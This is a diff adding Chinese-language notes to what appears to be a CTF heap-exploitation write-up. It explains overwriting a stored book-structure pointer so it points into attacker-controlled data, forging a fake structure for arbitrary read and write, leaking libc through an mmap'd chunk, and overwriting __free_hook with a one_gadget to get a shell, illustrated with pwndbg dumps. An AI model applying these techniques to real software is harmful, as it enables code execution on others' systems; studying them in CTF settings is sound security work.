@@ -121,5 +121,69 @@ pwndbg> x/8gx (0x555555554000+0x202040)
     book structure chunk
     ----high addr-----
 ```
-book_struct 中保存的指针指向的是book_structure
+book_struct 中保存的指针指向的是book_structure chunk ,**如果缩小了，将其落入description chunk中，那么就可以伪造一个book结构，**再使用edit函数还造成任意写和任意读。注意description chunk 应该申请的大一点。
 
+没覆盖前：
+```
+pwndbg> x/8gx (0x555555554000+0x202040)
+0x555555756040: 0x4141414141414141      0x4141414141414141
+0x555555756050: 0x4141414141414141      0x4141414141414141
+0x555555756060: 0x0000555555758180      0x00005555557581b0
+0x555555756070: 0x0000000000000000      0x0000000000000000
+```
+保存的指针值是0x0000555555758180
+**覆盖后指针指会变成0x0000555555758100**
+```
+pwndbg> x/8gx (0x555555554000+0x202040)
+0x555555756040: 0x4141414141414141      0x4141414141414141
+0x555555756050: 0x4141414141414141      0x4141414141414141
+0x555555756060: 0x0000555555758100      0x00005555557581b0
+0x555555756070: 0x0000000000000000      0x0000000000000000
+```
+此时的堆布局如下：
+```
+0x555555758010 FASTBIN {  //name chunk
+  prev_size = 0, 
+  size = 81, 
+  fd = 0x41, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x555555758060 PREV_INUSE { //description chunk
+  prev_size = 0, 
+  size = 273, 
+  fd = 0x4141414141414141, 
+  bk = 0x4141414141414141, 
+  fd_nextsize = 0x4141414141414141, 
+  bk_nextsize = 0x4141414141414141
+}
+0x555555758170 FASTBIN { //book strcture chunk
+  prev_size = 0, 
+  size = 49, 
+  fd = 0x1, 
+  bk = 0x555555758020, 
+  fd_nextsize = 0x555555758070, 
+  bk_nextsize = 0x100
+}
+```
+指针修改为0x0000555555758180正好落入description chunk中，那么就可以伪造book chunk了。
+
+**如何泄露libc地址：**
+申请一个很大的chunk，那么ptmalloc就会使用mmap来给他分配，mmap分配的内存和libc的基址的偏移是固定的，那么泄露了mmap分配的地址即可得到libc基址。
+用上一步的任意读写，泄露book2的name chunk的地址和description chunk的地址，再减去偏移即可得到libc的基址，再将__free_hook或者__malloc_hook修改为one_gadget即可getshell。
+
+create的book2的book structure的结构如下：
+```
+0x5555557581a0 FASTBIN {
+  prev_size = 0, 
+  size = 49, 
+  fd = 0x2, 
+  bk = 0x7ffff7fb5010, 
+  fd_nextsize = 0x7ffff7f93010, 
+  bk_nextsize = 0x21000
+}
+```
+其中保存的有name chunk ，description chunk的地址，用第一步泄露的book1的地址 加上 0x38即可指向这里。然后使用print函数泄露。
+
+完整的exp参考上传的文件。
